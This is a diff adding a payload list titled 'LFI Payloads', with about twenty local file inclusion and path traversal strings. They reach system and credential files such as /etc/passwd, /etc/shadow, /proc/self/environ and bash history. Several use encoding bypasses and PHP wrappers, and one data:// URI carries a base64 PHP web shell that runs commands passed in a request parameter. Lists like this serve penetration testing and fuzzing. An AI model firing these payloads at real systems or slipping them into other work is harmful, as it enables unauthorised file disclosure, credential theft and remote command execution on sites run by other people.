@@ -1,0 +1,22 @@
+# LFI Payloads
+../../../../../../etc/passwd
+../../../../../../etc/passwd%00
+....//....//....//....//etc/passwd
+..%252f..%252f..%252f..%252fetc/passwd
+/etc/passwd
+file:///etc/passwd
+/proc/self/environ
+/proc/self/cmdline
+/etc/hosts
+/etc/shadow
+/home/$USER/.bash_history
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+php://input
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
+..\\..\\..\\..\\..\\..\\windows\\win.ini
+c:\\windows\\win.ini
+..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..;/..;/..;/etc/passwd
+
